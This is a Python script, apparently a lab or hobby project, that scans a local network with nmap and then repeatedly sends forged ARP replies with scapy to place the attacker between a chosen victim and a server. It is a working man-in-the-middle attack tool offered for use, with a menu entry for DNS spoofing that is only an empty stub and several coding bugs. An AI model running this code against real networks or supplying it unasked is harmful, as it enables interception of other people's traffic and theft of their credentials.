from scapy.all import *
from scapy.layers import *
import threading
import time
import socket
import nmap
import os
import sys
from getmac import get_mac_address


# Default variables
settings={}
settings["restore_arp_choice"] = False
settings["VICTIM_MAC"] = "AA:AA:AA:AA:AA"
settings["VICTIM_IP"] = "0.0.0.0"
Net_Interface = "eth0" 
SERVER_IP = "192.168.56.102"
SERVER_MAC = '08:00:27:CC:08:6F'
ATTACKER_MAC = get_mac_address(interface=Net_Interface)
duckforce = False # Continously ARP poison the victims in order to not let them restore the ARP Caches

def start():

	

	def arp(VICTIM_MAC, VICTIM_IP, duckforce):
		while True:
			#Poisoning the Victim
			arp= Ether() / ARP()
			arp[Ether].src = ATTACKER_MAC
			arp[ARP].hwsrc = ATTACKER_MAC
			arp[ARP].psrc = SERVER_IP
			arp[ARP].hwdst = VICTIM_MAC
			arp[ARP].pdst = VICTIM_IP

			sendp(arp, iface=Net_Interface)

			#Poison the Server
			arp= Ether() / ARP()
			arp[Ether].src = ATTACKER_MAC
			arp[ARP].hwsrc = ATTACKER_MAC
			arp[ARP].psrc = VICTIM_IP
			arp[ARP].hwdst = SERVER_MAC
			arp[ARP].pdst = SERVER_IP

			sendp(arp, iface=Net_Interface)

			print("(Re-)poisoned the ARP of the following IPs: " + VICTIM_IP +" and "+ SERVER_IP)
			time.sleep(20)
    	
		return
	

	print("Want to scan for all connected devices in the network? (Y/N)")
	choice = input()
	addresses=[]
	if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
		target = '192.168.56.0/24'
 
		scanner = nmap.PortScanner()
		scanner.scan(target, arguments='-sn', sudo=True)
 
		hosts = []
 
		for host in scanner.all_hosts():
			addresses = scanner[host]['addresses']
 
			hosts.append(addresses)
	print('\n*** Hosts available to attack ***\n') 
	print(hosts)
	print("\n \nSet your Victim's IP Address")
	VICTIM_IP = input()
	settings["VICTIM_IP"] = VICTIM_IP
	print("\nSet your Victim's MAC Address (all capitals)")
	VICTIM_MAC = input()
	settings["VICTIM_MAC"] = VICTIM_MAC


	print("\nSelect attack to perform on Victim who hates ducks: \n")
	print("1:	ARP Poisoning" )
	print("2:	DNS Spoofing")
	print("3:	ARP Poisoning & DNS Spoofing \n \n")
	attack_to_perform = input()

	if attack_to_perform == "1":
		print("\nWould you like to restore the ARP once attack is finished? (Y/N)\n")
		choice = input()
		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
			settings["restore_arp_choice"] = True
		print("\nWould you like to rrepeadedly poison the ARP of the victim? (Y/N)\n")
		choice = input()
		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
			duckforce = True
		arp(VICTIM_MAC, VICTIM_IP, duckforce)
	
	elif attack_to_perform == "2":
		dns()
	
	elif attack_to_perform == "3":

		print("\nWould you like to restore the ARP once attack is finished? (Y/N)\n")
		choice = input()
		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
			settings["restore_arp_choice"] = True
		print("\nWould you like to rrepeadedly poison the ARP of the victim? (Y/N)\n")
		choice = input()
		if choice == "y" or choice == "Y" or choice == "yes" or choice =="YES":
			duckforce = True
		arp(VICTIM_MAC, VICTIM_IP, duckforce)
		#Do dns() shit


	def dns():
		return
		
def restore_arp(VICTIM_MAC, VICTIM_IP):
		arp = Ether() / ARP()
		arp[Ether].src = ATTACKER_MAC
		arp[Ether].dst = SERVER_MAC
		arp[ARP].hwsrc = VICTIM_MAC
		arp[ARP].psrc = VICTIM_IP
		arp[ARP].hwdst = SERVER_MAC
		arp[ARP].pdst = SERVER_IP
		sendp(arp, iface=Net_Interface)
        
       	 #Restore the ARP cache of the server
		arp = Ether() / ARP()
		arp[Ether].src = ATTACKER_MAC
		arp[Ether].dst = VICTIM_MAC
		arp[ARP].hwsrc = SERVER_MAC
		arp[ARP].psrc = SERVER_IP
		arp[ARP].hwdst = VICTIM_MAC
		arp[ARP].pdst = VICTIM_IP
		sendp(arp, iface=Net_Interface)
		return
		

if __name__ == '__main__':
	try:
		start()
	except KeyboardInterrupt:
        	print('Exiting program ...')
        	if settings["restore_arp_choice"]:
                    print("Restoring ARP caches of the infected Victims...")
                    
                    restore_arp(settings["VICTIM_MAC"], settings['VICTIM_IP'])
